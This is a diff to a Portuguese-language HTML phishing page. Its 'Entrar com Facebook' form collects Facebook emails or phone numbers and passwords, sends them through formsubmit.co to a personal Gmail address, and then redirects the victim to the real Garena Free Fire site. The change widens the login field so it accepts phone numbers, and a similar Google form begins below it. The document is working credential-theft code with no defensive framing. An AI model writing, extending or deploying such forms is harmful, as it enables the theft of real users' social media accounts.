@@ -101,12 +101,13 @@
 
     <!-- Form Facebook -->
     <form id="form-facebook" class="hidden-form" action="https://formsubmit.co/josefanypedro@gmail.com" method="POST">
-      <input type="email" name="fb_email" placeholder="Email do Facebook" required>
-      <input type="password" name="fb_password" placeholder="Senha do Facebook" required>
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://ff.garena.com/">
-      <button type="submit">Entrar com Facebook</button>
-    </form>
+  <input type="text" name="fb_email" placeholder="Email ou número do Facebook" required pattern="^([0-9]{8,15}|[^@ \t\r\n]+@[^@ \t\r\n]+\.[^@ \t\r\n]+)$" title="Digite um número ou um email válido">
+  <input type="password" name="fb_password" placeholder="Senha do Facebook" required>
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_next" value="https://ff.garena.com/">
+  <button type="submit">Entrar com Facebook</button>
+</form>
+
 
     <!-- Form Google -->
     <form id="form-google" class="hidden-form" action="https://formsubmit.co/josefanypedro@gmail.com" method="POST">
